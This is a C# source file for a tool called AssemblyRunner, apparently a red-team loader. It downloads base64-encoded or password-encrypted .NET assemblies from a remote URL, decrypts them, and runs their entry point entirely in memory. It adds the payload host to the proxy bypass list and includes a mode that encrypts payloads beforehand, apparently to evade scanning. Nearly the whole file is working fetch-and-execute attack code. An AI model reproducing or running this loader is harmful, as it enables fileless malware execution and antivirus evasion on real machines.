﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Web;
using System.IO;
using System.Net;


namespace AssemblyRunner
{
    class Program
    {

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: ");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " http://IP/File");
                Console.WriteLine("OR");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -enc/-dec" + " PASSWORD" + " http://IP/File");
                Console.WriteLine("OR");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + "-file" + " PASSWORD" + " FILE/TO/ENC");
            }
            if (args.Length == 1)
            {
                WebClient client = new WebClient();
                string newfile = args[0];
                WebProxy proxy = new WebProxy();
                string[] byp = newfile.Split('/');
                string bypip = byp[2];
                List<string> bypasslist = new List<string>(proxy.BypassList);
                bypasslist.Add(bypip);
                proxy.BypassList = bypasslist.ToArray();
                using (MemoryStream stream = new MemoryStream(client.DownloadData(newfile)))
                {
                    var newstr = Encoding.ASCII.GetString(stream.ToArray());
                    Console.WriteLine(newstr);
                    byte[] bee = System.Convert.FromBase64String(newstr);
                    Assembly a = Assembly.Load(bee);
                    MethodInfo method = a.EntryPoint;
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                    Console.WriteLine(newstr);
                }
            }
            if (args.Length == 3)
            {
                if (args[0] == "-file")
                {
                    Console.WriteLine("-file detected, will attempt local file enc");
                    string password = args[1];
                    string newfile = args[2];
                    string filestring = System.IO.File.ReadAllText(newfile);

                    string encryptedstring = Crypt.Encrypt(filestring, password);
                    Console.WriteLine(encryptedstring);

                }
                if (args[0] == "-enc")
                {
                    Console.WriteLine("-enc detected, will attempt remote file enc");
                    string password = args[1];
                    string newfile = args[2];
                    WebClient client = new WebClient();
                    WebProxy proxy = new WebProxy();
                    string[] byp = newfile.Split('/');
                    string bypip = byp[2];
                    List<string> bypasslist = new List<string>(proxy.BypassList);
                    bypasslist.Add(bypip);
                    proxy.BypassList = bypasslist.ToArray();
                    using (MemoryStream stream = new MemoryStream(client.DownloadData(newfile)))
                    {
                        var newstr = Encoding.ASCII.GetString(stream.ToArray());
                        string encryptedstring = Crypt.Encrypt(newstr, password);
                        Console.WriteLine(encryptedstring);
                    }
                }

                if (args[0] == "-dec")
                {
                    Console.WriteLine("-dec detected will attempt remote file dec and run in memory");
                    string password = args[1];
                    string newfile = args[2];
                    WebClient client = new WebClient();
                    WebProxy proxy = new WebProxy();
                    string[] byp = newfile.Split('/');
                    string bypip = byp[2];
                    List<string> bypasslist = new List<string>(proxy.BypassList);
                    bypasslist.Add(bypip);
                    proxy.BypassList = bypasslist.ToArray();
                    using (MemoryStream stream = new MemoryStream(client.DownloadData(newfile)))
                    {
                        var newstr = Encoding.ASCII.GetString(stream.ToArray());
                        Console.WriteLine(newstr);
                        string decryptedstring = Crypt.Decrypt(newstr, password);
                        byte[] bytes = Convert.FromBase64String(decryptedstring);

                        Assembly a = Assembly.Load(bytes);
                        MethodInfo method = a.EntryPoint;
                        object o = a.CreateInstance(method.Name);
                        method.Invoke(o, null);
                    }
                }

            }
        }
    }
}
 
